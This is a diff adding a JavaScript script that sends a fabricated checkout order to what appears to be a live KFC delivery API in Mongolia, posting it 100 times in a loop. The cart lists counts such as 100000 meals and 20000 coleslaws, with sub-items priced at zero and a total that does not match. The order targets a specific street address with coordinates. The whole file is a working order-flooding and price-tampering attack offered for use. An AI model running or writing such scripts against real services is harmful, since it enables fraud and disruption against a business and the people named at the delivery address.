@@ -1,0 +1,136 @@
+const axios = require("axios");
+let data = JSON.stringify({
+  cart: [
+    {
+      pkey: "1018762",
+      type: "combo",
+      count: 100000,
+      parent: 0,
+      index: 1,
+      name_mon: "ТЕНДЕРТЭЙ БАГЦ",
+      name_eng: "TENDER MEAL",
+      price: 18500,
+      menu_type: "ХVРГЭЛТ ТАХИАНЫ МАХ ТЕНДЕР БАГЦ",
+      pos_code: 0,
+      item_type: null,
+      img_url: "https://i.imgur.com/FHoX3p2.png",
+    },
+    {
+      pkey: "1000087",
+      type: "item",
+      count: 22,
+      parent: 1,
+      index: 2,
+      name_mon: "ТАХИА ХАЛУУН НОГООГҮЙ",
+      name_eng: "CHICKEN OR",
+      price: 0,
+      menu_type: "ХVРГЭЛТ ТАХИАНЫ МАХ ТЕНДЕР БАГЦ",
+      pos_code: 1000230,
+      item_type: "",
+      img_url: "https://imgur.com/Bo9Qw4i.png",
+    },
+    {
+      pkey: "1000138",
+      type: "item",
+      count: 44,
+      parent: 1,
+      index: 3,
+      name_mon: "ТЕНДЕР",
+      name_eng: "TENDER",
+      price: 0,
+      menu_type: "ХVРГЭЛТ ТАХИАНЫ МАХ ТЕНДЕР БАГЦ",
+      pos_code: 1000178,
+      item_type: "",
+      img_url: "https://imgur.com/n1aRveI.png",
+    },
+    {
+      pkey: "1013111",
+      type: "item",
+      count: 20000,
+      parent: 1,
+      index: 4,
+      name_mon: "КОУЛСЛО Ж",
+      name_eng: "COLESLAW R",
+      price: 0,
+      menu_type: "ХVРГЭЛТ ТАХИАНЫ МАХ ТЕНДЕР БАГЦ",
+      pos_code: 1013119,
+      item_type: "",
+      img_url: "https://imgur.com/6vKpDRP.png",
+    },
+    {
+      pkey: "1018941",
+      type: "item",
+      count: 11,
+      parent: 1,
+      index: 5,
+      name_mon: "САВЛАГАА",
+      name_eng: "PACKAGE",
+      price: 0,
+      menu_type: "ХVРГЭЛТ ТАХИАНЫ МАХ ТЕНДЕР БАГЦ",
+      pos_code: 1018979,
+      item_type: "",
+      img_url: "",
+    },
+  ],
+  outlet: "KFC-21",
+  address: {
+    podcode: "6P06",
+    podph: "6P06",
+    bairname: "Ди центер D center",
+    city: "УБ",
+    horoo: "19-р хороо",
+    podtoktok: "toktok",
+    latitude: "47.914803",
+    podkfc: "k7p08",
+    geopoint: "47.914803, 106.822618",
+    lon: "106.822618",
+    full_address: "СХД, 19-р хороо, Ди центер D center",
+    bairnote: "34-р байрны хойд талд",
+    district: "СХД",
+    id: "8714",
+    lat: "47.914803",
+    longitude: "106.822618",
+  },
+  options: {
+    origin: "",
+    channel: "web",
+    order_type: 1,
+    advance_order: 0,
+    promised_time: "",
+    phone2: "",
+    pickup_type: "",
+    pay_type: "",
+    pay_type_name: "",
+    customer_note: "",
+    vat_type: 1,
+    vat_regno: "",
+    vat_cust_name: "",
+    employee: "",
+    menu_total: 203500,
+    delivery_charge: 0,
+    coupon_codes: [],
+    rkeeperCoupons: [],
+    reducedTotal: 203500,
+  },
+});
+
+let config = {
+  method: "post",
+  maxBodyLength: Infinity,
+  url: "https://6kda0vgse0.execute-api.ap-southeast-1.amazonaws.com/production/checkout",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  data: data,
+};
+
+for (let i = 0; i < 100; i++) {
+  axios
+    .request(config)
+    .then((response) => {
+      console.log(JSON.stringify(response.data));
+    })
+    .catch((error) => {
+      console.log(error);
+    });
+}
